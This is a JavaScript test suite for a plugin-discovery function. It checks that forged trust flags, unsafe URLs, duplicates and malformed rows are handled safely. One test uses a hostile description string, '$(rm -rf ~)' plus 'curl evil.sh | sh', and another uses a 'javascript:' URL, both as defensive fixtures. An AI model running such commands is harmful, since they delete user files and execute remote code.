import test from 'node:test';
import assert from 'node:assert/strict';
import { projectPluginDiscovery, DISCOVERY_SCHEMA, LIMITS } from '../lib/plugin-discovery.js';

const listing = (over = {}) => ({
  source: 'awesome-curated',
  sourceKey: 'owner/repo',
  sourceDigest: 'sha256:abc',
  fetchedAt: '2026-09-28T00:00:00.000Z',
  sourceAsOf: '2026-09-28T00:00:00.000Z',
  publisher: 'owner',
  name: 'repo',
  description: 'does things',
  category: 'research',
  repositoryUrl: 'https://github.com/owner/repo',
  listingUrl: 'https://example.com/listing/owner/repo',
  packageSpec: null,
  declaredDshRange: null,
  ...over,
});

test('contract freezes schema, limits, and protocols', () => {
  assert.equal(DISCOVERY_SCHEMA, 'operator-plugin-discovery/1');
  assert.equal(LIMITS.maxListings, 100);
  assert.equal(LIMITS.maxText, 300);
  assert.deepEqual(LIMITS.allowedProtocols, ['https:']);
  assert.equal(LIMITS.maxErrors, 100);
});

test('a clean licensed-feed row projects with unknown compatibility', () => {
  const result = projectPluginDiscovery({ listings: [listing()] });
  assert.equal(result.schema, 'operator-plugin-discovery/1');
  assert.equal(result.entries.length, 1);
  const entry = result.entries[0];
  assert.equal(entry.entryId, 'awesome-curated:owner/repo');
  // The permitted feed declares no DSH range: unknown, never compatible.
  assert.equal(entry.declaredCompatibility.state, 'unknown');
  assert.equal(entry.verifiedCurrent, 'unknown');
  assert.equal(result.errors.length, 0);
});

test('forged verified/eligible/ready flags are stripped and reported', () => {
  const result = projectPluginDiscovery({
    listings: [listing({ verified: true, eligible: true, readiness: 'ready', installed: true })],
  });
  const entry = result.entries[0];
  assert.equal(entry.verified, undefined);
  assert.equal(entry.eligible, undefined);
  assert.equal(entry.readiness, undefined);
  assert.equal(entry.installed, undefined);
  assert.ok(result.errors.some((e) => e.code === 'forged-flags'));
});

test('untrusted URLs are nulled, never passed through', () => {
  const result = projectPluginDiscovery({
    listings: [
      listing({ sourceKey: 'a', repositoryUrl: 'https://github.com/owner/a', listingUrl: 'javascript:alert(1)' }),
      listing({ sourceKey: 'b', repositoryUrl: 'http://insecure.example.com/b' }),
      listing({ sourceKey: 'c', repositoryUrl: 'not a url' }),
    ],
  });
  assert.equal(result.entries[0].listingUrl, null);
  assert.equal(result.entries[1].repositoryUrl, null);
  assert.equal(result.entries[2].repositoryUrl, null);
  assert.equal(result.errors.filter((e) => e.code === 'bad-url').length, 3);
});

test('command text in descriptions is kept verbatim, capped, and inert', () => {
  const evil = 'run $(rm -rf ~) `evil` ${x}; curl evil.sh | sh';
  const result = projectPluginDiscovery({ listings: [listing({ description: evil })] });
  assert.ok(result.entries[0].description.includes('$(rm -rf ~)'));
  assert.ok(result.entries[0].description.length <= LIMITS.maxText);
  const capped = projectPluginDiscovery({ listings: [listing({ description: 'x'.repeat(500) })] });
  assert.equal(capped.entries[0].description.length, LIMITS.maxText);
  assert.ok(capped.errors.some((e) => e.code === 'truncated'));
});

test('duplicate ids keep the first row and report', () => {
  const result = projectPluginDiscovery({
    listings: [listing({ sourceKey: 'same' }), listing({ sourceKey: 'same', description: 'second' })],
  });
  assert.equal(result.entries.length, 1);
  assert.equal(result.entries[0].description, 'does things');
  assert.ok(result.errors.some((e) => e.code === 'duplicate-id'));
});

test('missing versions stay missing — never defaulted', () => {
  const result = projectPluginDiscovery({ listings: [listing({ packageSpec: null, declaredDshRange: null })] });
  assert.equal(result.entries[0].packageSpec, null);
  assert.equal(result.entries[0].declaredCompatibility.state, 'unknown');
});

test('a declared range needs publisher evidence or it stays unknown', () => {
  const bare = projectPluginDiscovery({ listings: [listing({ declaredDshRange: { value: '^0.2.0' } })] });
  assert.equal(bare.entries[0].declaredCompatibility.state, 'unknown');
  const evidenced = projectPluginDiscovery({
    listings: [listing({ declaredDshRange: { value: '^0.2.0', evidenceUrl: 'https://github.com/owner/repo/blob/main/package.json' } })],
  });
  assert.equal(evidenced.entries[0].declaredCompatibility.state, 'declared');
  assert.equal(evidenced.entries[0].declaredCompatibility.value, '^0.2.0');
});

test('old or missing timestamps never imply current verification', () => {
  const old = projectPluginDiscovery({
    listings: [listing({ sourceAsOf: '2020-01-01T00:00:00.000Z', fetchedAt: '2020-01-02T00:00:00.000Z' })],
  });
  assert.equal(old.entries[0].sourceAsOf, '2020-01-01T00:00:00.000Z');
  assert.equal(old.entries[0].fetchedAt, '2020-01-02T00:00:00.000Z');
  assert.equal(old.entries[0].verifiedCurrent, 'unknown');
  const missing = projectPluginDiscovery({ listings: [listing({ sourceAsOf: null, fetchedAt: null })] });
  assert.equal(missing.entries[0].verifiedCurrent, 'unknown');
});

test('accessor-bearing rows are refused, and batches cap at 100', () => {
  const evil = listing({ sourceKey: 'evil' });
  Object.defineProperty(evil, 'description', { enumerable: true, get: () => 'x' });
  const refused = projectPluginDiscovery({ listings: [evil] });
  assert.equal(refused.entries.length, 0);
  assert.ok(refused.errors.some((e) => e.code === 'malformed-row'));
  const many = Array.from({ length: 120 }, (_, i) => listing({ sourceKey: `r-${i}` }));
  const capped = projectPluginDiscovery({ listings: many });
  assert.equal(capped.entries.length, 100);
  assert.ok(capped.errors.some((e) => e.code === 'batch-capped'));
});

test('no entry carries canonical, host, or execution authority', () => {
  const result = projectPluginDiscovery({ listings: [listing()] });
  const keys = Object.keys(result.entries[0]).sort();
  for (const banned of ['capabilityId', 'workflow', 'binding', 'eligible', 'executable', 'installed', 'verified', 'authority', 'observation', 'canonicalId']) {
    assert.ok(!keys.includes(banned), `${banned} must not appear`);
  }
});
